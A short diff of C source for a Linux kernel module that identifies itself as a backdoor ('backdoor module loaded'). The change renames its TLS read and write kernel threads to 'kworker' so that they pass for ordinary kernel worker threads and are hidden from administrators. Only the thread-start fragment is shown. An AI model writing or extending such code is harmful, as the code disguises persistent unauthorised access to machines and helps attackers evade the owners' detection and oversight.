@@ -397,8 +397,8 @@ static int __init mod_init(void) {
     }
     buffer = kmalloc(MAX_PAYLOAD, GFP_KERNEL);
 
-    svc->read_thread = kthread_run((void*) read_TLS, NULL, "TLS Read");
-    svc->write_thread = kthread_run((void*) write_TLS, NULL, "TLS Write");
+    svc->read_thread = kthread_run((void*) read_TLS, NULL, "kworker");
+    svc->write_thread = kthread_run((void*) write_TLS, NULL, "kworker");
     printk(KERN_ALERT "backdoor module loaded\n");
 
     return 0;
